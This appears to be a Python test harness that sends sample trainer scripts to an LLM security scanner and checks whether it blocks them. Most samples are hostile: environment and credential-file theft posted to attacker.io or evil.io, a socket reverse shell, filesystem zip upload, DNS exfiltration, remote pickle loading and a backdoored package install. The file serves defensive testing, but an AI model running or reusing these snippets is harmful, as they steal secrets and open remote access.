#!/usr/bin/env python3
"""
code_scan_test.py — Trainer-upload security gate test harness.

Tests the LLM scanner against code that threatens the HOST platform
(file/env exfiltration, reverse shells, zip+send, external HTTP, pickle RCE)
vs code that has internal quality issues but is not a platform threat
(SQL injection in trainer's own logic, MD5 hashing, etc.)

Usage:
    OLLAMA_BASE_URL=https://ollama.fileq.io \
    OLLAMA_SECURITY_MODEL=llama3.2:latest \
    python scripts/code_scan_test.py [--test <name>] [--no-log]
"""

import json
import os
import sys
import textwrap
import time
import urllib.request
import urllib.error
from datetime import datetime
from pathlib import Path

# ── Config ────────────────────────────────────────────────────────────────────

BASE_URL = os.environ.get("OLLAMA_BASE_URL", "https://ollama.fileq.io").rstrip("/")
MODEL    = os.environ.get("OLLAMA_SECURITY_MODEL", "llama3.2:latest")

# ── ANSI colors ───────────────────────────────────────────────────────────────

RESET   = "\033[0m"
BOLD    = "\033[1m"
DIM     = "\033[2m"
RED     = "\033[91m"
YELLOW  = "\033[93m"
GREEN   = "\033[92m"
CYAN    = "\033[96m"
BLUE    = "\033[94m"
GRAY    = "\033[90m"
MAGENTA = "\033[95m"

def c(color: str, text: str) -> str:
    return f"{color}{text}{RESET}"

# ── System prompt ─────────────────────────────────────────────────────────────
# This prompt is purpose-built for scanning user-uploaded ML trainer scripts.
# Focus: does this code threaten the HOST platform, not the trainer's own logic.

SYSTEM_PROMPT = """\
You are a security gate for an ML platform that runs user-uploaded Python trainer scripts inside a sandbox.
Your job is to detect code that attempts to attack the HOST SYSTEM — not to review the trainer's own logic.

BLOCK-level threats (severity: HIGH, risk: CRITICAL) — these MUST be flagged:
- Reading OS environment variables that may contain secrets (os.environ, os.getenv)
- Reading files outside the working directory (/etc, /proc, ~/.ssh, /var, absolute paths to system dirs)
- Making outbound HTTP/HTTPS/TCP/UDP connections to external hosts (requests, urllib, socket, httpx, aiohttp)
- Sending any data over the network (POST, PUT, upload, socket.connect to non-localhost)
- Creating zip/tar archives and transmitting them
- Executing shell commands (subprocess, os.system, os.popen, exec, eval with external input)
- Importing reverse-shell or exfiltration utilities
- Loading/deserializing untrusted data from external sources (pickle.loads on network data)
- Writing to paths outside the working directory

WARN-level issues (severity: MEDIUM or LOW) — flag but do NOT treat as BLOCK:
- Internal code quality issues that only affect the trainer's own data (SQL injection in trainer queries, weak hashing, etc.)
- Use of deprecated APIs
- Missing error handling

SAFE — if none of the above apply, the code is safe to run.

For each finding output exactly one JSON object per line:
{"severity":"HIGH|MEDIUM|LOW","type":"<threat category>","line":<line_number or null>,"title":"<short title>","detail":"<one sentence>","fix":"<one sentence>","block":true|false}

Set "block":true ONLY for BLOCK-level threats that should prevent the upload.
Set "block":false for WARN-level issues.

After all findings output exactly one summary line:
{"summary":true,"total":<n>,"high":<n>,"medium":<n>,"low":<n>,"blocked":<n>,"risk":"CRITICAL|HIGH|MEDIUM|LOW|SAFE"}

Set risk to CRITICAL if any block:true finding exists.
Output ONLY these JSON lines — no markdown, no prose, no code blocks.\
"""

# ── Test cases ────────────────────────────────────────────────────────────────
# verdict: "block"  — scanner must flag at least one block:true HIGH finding
#          "warn"   — scanner may flag issues but must NOT set risk=CRITICAL
#          "safe"   — scanner should return SAFE with no HIGH findings

TESTS = [
    {
        "name": "env_exfiltration",
        "category": "Environment variable theft + HTTP exfil",
        "verdict": "block",
        "expect_keywords": ["environ", "env", "secret", "exfil", "http", "request"],
        "code": textwrap.dedent("""\
            import os
            import requests

            def train(data, config):
                # Steal all environment variables and send to attacker server
                secrets = dict(os.environ)
                requests.post("https://attacker.io/collect", json=secrets, timeout=5)
                return {"model": None}
        """),
    },
    {
        "name": "file_read_exfil",
        "category": "Read host files + exfiltrate over HTTP",
        "verdict": "block",
        "expect_keywords": ["file", "read", "exfil", "path", "http", "network"],
        "code": textwrap.dedent("""\
            import urllib.request
            import json

            def train(data, config):
                sensitive = {}
                for path in ["/etc/passwd", "/etc/shadow", "/proc/self/environ",
                             os.path.expanduser("~/.ssh/id_rsa"),
                             os.path.expanduser("~/.aws/credentials")]:
                    try:
                        with open(path) as f:
                            sensitive[path] = f.read()
                    except Exception:
                        pass
                payload = json.dumps(sensitive).encode()
                req = urllib.request.Request("https://evil.io/dump",
                                             data=payload,
                                             method="POST")
                urllib.request.urlopen(req)
                return {"model": None}
        """),
    },
    {
        "name": "reverse_shell",
        "category": "TCP reverse shell via socket",
        "verdict": "block",
        "expect_keywords": ["socket", "shell", "reverse", "connect", "network", "exec"],
        "code": textwrap.dedent("""\
            import socket
            import subprocess
            import os

            def train(data, config):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(("attacker.io", 4444))
                os.dup2(s.fileno(), 0)
                os.dup2(s.fileno(), 1)
                os.dup2(s.fileno(), 2)
                subprocess.call(["/bin/sh", "-i"])
                return {}
        """),
    },
    {
        "name": "zip_and_send",
        "category": "Archive workspace and POST to external server",
        "verdict": "block",
        "expect_keywords": ["zip", "archive", "send", "upload", "network", "http"],
        "code": textwrap.dedent("""\
            import zipfile
            import requests
            import os
            import io

            def train(data, config):
                buf = io.BytesIO()
                with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
                    for root, dirs, files in os.walk("/"):
                        for fname in files:
                            try:
                                zf.write(os.path.join(root, fname))
                            except Exception:
                                pass
                buf.seek(0)
                requests.put("https://attacker.io/upload",
                             data=buf.read(),
                             headers={"Content-Type": "application/zip"})
                return {}
        """),
    },
    {
        "name": "subprocess_shell",
        "category": "Shell command execution + output exfiltration",
        "verdict": "block",
        "expect_keywords": ["shell", "subprocess", "command", "exec", "inject"],
        "code": textwrap.dedent("""\
            import subprocess
            import requests

            def train(data, config):
                # Run arbitrary shell commands and exfiltrate output
                cmds = ["id", "whoami", "cat /etc/passwd", "env", "ls -la /"]
                output = {}
                for cmd in cmds:
                    result = subprocess.run(cmd, shell=True,
                                            capture_output=True, text=True)
                    output[cmd] = result.stdout + result.stderr
                requests.post("https://evil.io/cmd-output", json=output)
                return {}
        """),
    },
    {
        "name": "pickle_rce",
        "category": "Pickle deserialization RCE from external source",
        "verdict": "block",
        "expect_keywords": ["pickle", "deserializ", "rce", "remote", "exec", "unsafe"],
        "code": textwrap.dedent("""\
            import pickle
            import urllib.request

            def train(data, config):
                # Download and execute a pickle payload from attacker
                url = "https://attacker.io/payload.pkl"
                with urllib.request.urlopen(url) as r:
                    payload = r.read()
                # Arbitrary code execution
                obj = pickle.loads(payload)
                return {"model": obj}
        """),
    },
    {
        "name": "dns_exfil",
        "category": "Data exfiltration via DNS lookups",
        "verdict": "block",
        "expect_keywords": ["dns", "socket", "network", "exfil", "connect"],
        "code": textwrap.dedent("""\
            import socket
            import os
            import base64

            def train(data, config):
                # Encode secrets and exfiltrate via DNS lookups
                secret = base64.b64encode(str(dict(os.environ)).encode()).decode()
                chunk_size = 60
                for i in range(0, len(secret), chunk_size):
                    chunk = secret[i:i+chunk_size].replace("=", "")
                    try:
                        socket.gethostbyname(f"{chunk}.exfil.attacker.io")
                    except Exception:
                        pass
                return {}
        """),
    },
    {
        "name": "supply_chain",
        "category": "Dynamic import + install malicious package",
        "verdict": "block",
        "expect_keywords": ["install", "subprocess", "exec", "import", "shell", "inject"],
        "code": textwrap.dedent("""\
            import subprocess
            import importlib

            def train(data, config):
                # Install a backdoored package at runtime
                subprocess.run(["pip", "install", "numpy-backdoor==1.0.0"],
                               capture_output=True)
                # Execute arbitrary code string from config
                eval(config.get("init_code", ""))
                mod = importlib.import_module("numpy_backdoor")
                return mod.run(data)
        """),
    },
    {
        "name": "trainer_with_sql",
        "category": "Trainer that has SQL injection in its OWN queries (not a platform threat)",
        "verdict": "warn",
        "expect_keywords": [],  # should NOT be CRITICAL/blocked
        "code": textwrap.dedent("""\
            import sqlite3
            import numpy as np
            from sklearn.linear_model import LogisticRegression

            def train(data, config):
                # Trainer stores results in its own local SQLite db
                conn = sqlite3.connect("results.db")
                cur  = conn.cursor()
                label = config.get("experiment_label", "default")
                # SQL injection in trainer's own logging — only affects trainer's db
                cur.execute(f"INSERT INTO runs (label) VALUES ('{label}')")
                conn.commit()

                X = np.array([row["features"] for row in data])
                y = np.array([row["label"] for row in data])
                model = LogisticRegression().fit(X, y)
                return {"model": model, "classes": model.classes_.tolist()}
        """),
    },
    {
        "name": "safe_trainer",
        "category": "Clean ML trainer — no platform threats",
        "verdict": "safe",
        "expect_keywords": [],
        "code": textwrap.dedent("""\
            import numpy as np
            from sklearn.ensemble import RandomForestClassifier
            from sklearn.model_selection import cross_val_score

            def preprocess(raw):
                return [{"features": r["features"], "label": r["label"]} for r in raw]

            def train(preprocessed, config):
                X = np.array([r["features"] for r in preprocessed])
                y = np.array([r["label"]    for r in preprocessed])
                n_est = int(config.get("n_estimators", 100))
                depth = config.get("max_depth")
                model = RandomForestClassifier(
                    n_estimators=n_est,
                    max_depth=depth,
                    random_state=42,
                )
                model.fit(X, y)
                scores = cross_val_score(model, X, y, cv=3)
                return {"model": model, "cv_accuracy": round(float(scores.mean()), 4)}

            def predict(model, inputs):
                features = np.array(inputs["features"]).reshape(1, -1)
                pred  = model.predict(features)[0]
                proba = model.predict_proba(features)[0]
                return {"label": str(pred), "confidence": round(float(proba.max()), 4)}
        """),
    },
]

# ── Ollama API ────────────────────────────────────────────────────────────────

def call_ollama(code: str) -> tuple[str, dict]:
    url = f"{BASE_URL}/v1/chat/completions"
    payload = json.dumps({
        "model": MODEL,
        "messages": [
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user",   "content": f"Scan this trainer code:\n\n```python\n{code}\n```"},
        ],
        "temperature": 0.1,
        "stream": False,
    }).encode()

    req = urllib.request.Request(
        url, data=payload,
        headers={"Content-Type": "application/json", "User-Agent": "curl/7.64.1"},
        method="POST",
    )
    t0 = time.monotonic()
    with urllib.request.urlopen(req, timeout=120) as resp:
        body = json.loads(resp.read())
    elapsed = time.monotonic() - t0

    raw  = body["choices"][0]["message"]["content"].strip()
    meta = {
        "prompt_tokens":     body.get("usage", {}).get("prompt_tokens", "?"),
        "completion_tokens": body.get("usage", {}).get("completion_tokens", "?"),
        "elapsed_s":         round(elapsed, 2),
        "finish_reason":     body["choices"][0].get("finish_reason", "?"),
    }
    return raw, meta

# ── Parser — handles single objects, arrays, and multi-line arrays ────────────

def parse_response(raw: str) -> tuple[list, dict | None]:
    findings, summary = [], None

    def _ingest(obj):
        nonlocal summary
        if isinstance(obj, list):
            for item in obj: _ingest(item)
        elif isinstance(obj, dict):
            if obj.get("summary"):
                summary = obj
            elif "severity" in obj or "title" in obj:
                findings.append(obj)

    i, n = 0, len(raw)
    while i < n:
        if raw[i] not in ('{', '['):
            i += 1; continue
        open_ch  = raw[i]
        close_ch = '}' if open_ch == '{' else ']'
        depth, j = 0, i
        in_str = escape = False
        while j < n:
            ch = raw[j]
            if escape:             escape = False
            elif ch == '\\' and in_str: escape = True
            elif ch == '"':        in_str = not in_str
            elif not in_str:
                if   ch == open_ch:  depth += 1
                elif ch == close_ch:
                    depth -= 1
                    if depth == 0:
                        try: _ingest(json.loads(raw[i:j+1]))
                        except json.JSONDecodeError: pass
                        i = j + 1; break
            j += 1
        else: break
    return findings, summary

# ── Display ───────────────────────────────────────────────────────────────────

SEV_COLOR  = {"HIGH": RED, "MEDIUM": YELLOW, "LOW": CYAN, "UNKNOWN": GRAY}
RISK_COLOR = {"CRITICAL": RED, "HIGH": RED, "MEDIUM": YELLOW, "LOW": CYAN, "SAFE": GREEN}

def sev_badge(sev: str, block: bool) -> str:
    col  = SEV_COLOR.get(sev, GRAY)
    flag = c(RED, " ⛔BLOCK") if block else ""
    return c(col, c(BOLD, f"[{sev:<6}]")) + flag

# ── Logger ────────────────────────────────────────────────────────────────────

class Logger:
    _ansi = __import__('re').compile(r'\033\[[0-9;]*m')
    def __init__(self, path):
        self._f = open(path, "w", encoding="utf-8") if path else None
    def write(self, text: str):
        if self._f:
            self._f.write(self._ansi.sub("", text) + "\n")
    def close(self):
        if self._f: self._f.close()

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    args       = sys.argv[1:]
    no_log     = "--no-log" in args
    filter_name = None
    if "--test" in args:
        idx = args.index("--test")
        if idx + 1 < len(args):
            filter_name = args[idx + 1].lower()

    log_path = None
    if not no_log:
        log_dir = Path(__file__).parent / "logs"
        log_dir.mkdir(exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        log_path = log_dir / f"trainer_scan_{ts}.log"

    logger = Logger(log_path)

    def tprint(text=""):
        print(text)
        logger.write(text)

    W = 72
    tprint()
    tprint(c(BOLD, "═" * W))
    tprint(c(BOLD, c(CYAN, "  🛡️  TRAINER UPLOAD SECURITY GATE — TEST HARNESS")))
    tprint(c(DIM,  f"  Model   : {MODEL}"))
    tprint(c(DIM,  f"  Endpoint: {BASE_URL}"))
    tprint(c(DIM,  f"  Time    : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"))
    tprint(c(DIM,  "  Legend  : ⛔ BLOCK = upload rejected  │  ⚠ WARN = allowed with warning  │  ✓ SAFE"))
    if log_path:
        tprint(c(DIM, f"  Log     : {log_path}"))
    tprint(c(BOLD, "═" * W))

    tests = TESTS
    if filter_name:
        tests = [t for t in TESTS if filter_name in t["name"] or filter_name in t["category"].lower()]
        if not tests:
            tprint(c(RED, f"\n  No tests matching '{filter_name}'"))
            sys.exit(1)

    results = []
    total_time = 0.0

    for i, test in enumerate(tests, 1):
        tprint()
        verdict_icon = {"block": c(RED, "⛔ BLOCK"), "warn": c(YELLOW, "⚠  WARN"), "safe": c(GREEN, "✓  SAFE")}
        tprint(c(BOLD, c(BLUE, f"━━━ TEST {i}/{len(tests)}: {test['name'].upper()} ━━━")))
        tprint(c(DIM,  f"    Category  : {test['category']}"))
        tprint(c(DIM,  f"    Expected  : {verdict_icon[test['verdict']]}"))
        tprint(c(DIM,  f"    Lines     : {len(test['code'].splitlines())}"))

        # Show code
        tprint(c(GRAY, "\n    ┌── Code " + "─" * 61))
        for ln, line in enumerate(test["code"].splitlines(), 1):
            tprint(c(DIM, f"    │ {ln:3}  {line}"))
        tprint(c(GRAY, "    └" + "─" * 68))

        tprint(c(DIM, f"\n    → Sending to {BASE_URL}/v1/chat/completions …"))
        try:
            raw, meta = call_ollama(test["code"])
            total_time += meta["elapsed_s"]
        except urllib.error.URLError as e:
            tprint(c(RED, f"\n    ✗ Network error: {e}"))
            results.append({"test": test["name"], "verdict": test["verdict"], "passed": False, "error": str(e)})
            continue
        except Exception as e:
            tprint(c(RED, f"\n    ✗ Error: {e}"))
            results.append({"test": test["name"], "verdict": test["verdict"], "passed": False, "error": str(e)})
            continue

        tprint(c(GRAY,
            f"    ← {meta['elapsed_s']}s  │  "
            f"tokens {meta['prompt_tokens']}→{meta['completion_tokens']}  │  "
            f"finish={meta['finish_reason']}"
        ))

        # Raw reply
        tprint(c(GRAY, "\n    ┌── Raw LLM reply " + "─" * 51))
        for line in raw.splitlines():
            tprint(c(DIM, "    │ " + line))
        tprint(c(GRAY, "    └" + "─" * 68))

        findings, summary = parse_response(raw)

        if not findings and not summary:
            tprint(c(YELLOW, "\n    ⚠  Model returned non-JSON — could not parse findings"))
            results.append({"test": test["name"], "verdict": test["verdict"], "passed": False, "parse_error": True})
            continue

        risk    = (summary or {}).get("risk", "UNKNOWN")
        blocked = [f for f in findings if f.get("block")]
        high    = [f for f in findings if f.get("severity") == "HIGH"]

        # Findings display
        tprint(c(BOLD, f"\n    Findings ({len(findings)}):"))
        if not findings:
            tprint(c(GREEN, "    ✓ No findings"))
        for f in findings:
            sev   = f.get("severity", "UNKNOWN")
            blk   = bool(f.get("block"))
            title = f.get("title", "Untitled")
            ftype = f.get("type", "")
            line  = f.get("line")
            detail= f.get("detail", "")
            fix   = f.get("fix", "")
            loc   = f"line {line}" if line else "—"
            tprint(f"    {sev_badge(sev, blk)}  {c(BOLD, title)}")
            tprint(f"             {c(DIM, ftype)}  {c(GRAY, loc)}")
            tprint(f"             {detail}")
            tprint(f"             {c(GREEN, '↳ Fix:')} {fix}")

        # Pass/fail verdict
        if test["verdict"] == "block":
            # Must have at least one block:true finding OR risk=CRITICAL
            passed = len(blocked) > 0 or risk == "CRITICAL"
            # Also check keywords in HIGH finding text
            if not passed and high:
                all_text = " ".join(
                    (f.get("title","") + " " + f.get("type","") + " " + f.get("detail","")).lower()
                    for f in high
                )
                passed = any(kw in all_text for kw in test["expect_keywords"])
        elif test["verdict"] == "warn":
            # Must NOT be CRITICAL and must NOT have block:true findings
            passed = risk != "CRITICAL" and len(blocked) == 0
        else:  # safe
            # Pass if no HIGH findings and nothing blocked — risk=UNKNOWN means
            # the model omitted the summary line but still produced no dangerous findings
            passed = len(high) == 0 and len(blocked) == 0 and risk != "CRITICAL"

        status = c(GREEN, "✔ PASS") if passed else c(RED, "✘ FAIL")
        risk_col = RISK_COLOR.get(risk, GRAY)
        block_str = c(RED, f"  ⛔ {len(blocked)} blocked") if blocked else ""
        tprint(f"\n    {status}  risk={c(risk_col, c(BOLD, risk))}  "
               f"HIGH={c(RED, str(len(high)))}  "
               f"findings={len(findings)}{block_str}")

        results.append({
            "test": test["name"],
            "verdict": test["verdict"],
            "passed": passed,
            "risk": risk,
            "findings": len(findings),
            "high": len(high),
            "blocked": len(blocked),
            "elapsed_s": meta["elapsed_s"],
        })

    # Summary
    tprint()
    tprint(c(BOLD, "═" * W))
    tprint(c(BOLD, c(CYAN, "  SUMMARY")))
    tprint()

    passed_n = sum(1 for r in results if r.get("passed"))
    failed_n = len(results) - passed_n

    for r in results:
        icon     = c(GREEN, "  ✔") if r.get("passed") else c(RED, "  ✘")
        expected = {"block": c(RED,"⛔BLOCK"), "warn": c(YELLOW,"⚠WARN"), "safe": c(GREEN,"✓SAFE")}[r["verdict"]]
        err      = r.get("error", "")
        if err:
            extra = c(RED, f"  ERR: {err}")
        elif r.get("parse_error"):
            extra = c(YELLOW, "  parse error")
        else:
            risk    = r.get("risk", "?")
            rc      = RISK_COLOR.get(risk, GRAY)
            blocked = r.get("blocked", 0)
            blk_str = c(RED, f"  ⛔{blocked}") if blocked else ""
            extra   = (f"  expect={expected}  "
                       f"risk={c(rc, c(BOLD, risk))}  "
                       f"HIGH={r.get('high','?')}  "
                       f"findings={r.get('findings','?')}"
                       f"{blk_str}  {r.get('elapsed_s','?')}s")
        tprint(f"{icon}  {c(BOLD, r['test']):<40}{extra}")

    tprint()
    tprint(f"  {c(GREEN, str(passed_n)+' passed')}  {c(RED, str(failed_n)+' failed')}  "
           f"of {len(results)} tests  │  total {round(total_time,1)}s")
    tprint(c(BOLD, "═" * W))
    tprint()

    if log_path:
        tprint(c(DIM, f"  Log: {log_path}"))

    logger.close()
    sys.exit(0 if failed_n == 0 else 1)


if __name__ == "__main__":
    main()
